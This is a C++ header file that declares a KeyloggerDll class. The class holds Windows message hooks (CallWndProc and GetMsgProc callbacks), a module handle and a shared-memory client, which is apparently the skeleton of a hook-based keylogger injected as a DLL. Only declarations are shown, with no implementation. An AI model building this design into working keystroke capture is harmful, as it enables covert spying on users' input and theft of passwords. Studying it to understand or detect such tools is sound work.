#pragma once
#include "SharedMemoryClient.h"

class KeyloggerDll
{

public:
	KeyloggerDll(HMODULE hModule);
	~KeyloggerDll();

	void		setModuleHandle(HMODULE hModule);
	int			loadHook();
	void		MessageLoop();
private:
	
	HMODULE		_hModule;
	HHOOK		_postMsgHook;
	HHOOK		_getMsgHook;

public:
	SharedMemoryClient		_shm;
	// Get singleton unique instance
//	static KeyloggerDll& GetInstance();
	
	LRESULT CALLBACK CallWndProc(int nCode, WPARAM wParam, LPARAM lParam);
	LRESULT CALLBACK GetMsgProc(int nCode, WPARAM wParam, LPARAM lParam);

};

LRESULT CALLBACK CallWndProcFn(
	_In_  int nCode,
	_In_  WPARAM wParam,
	_In_  LPARAM lParam
	);
LRESULT CALLBACK GetMsgProcFn(
	_In_  int nCode,
	_In_  WPARAM wParam,
	_In_  LPARAM lParam
	);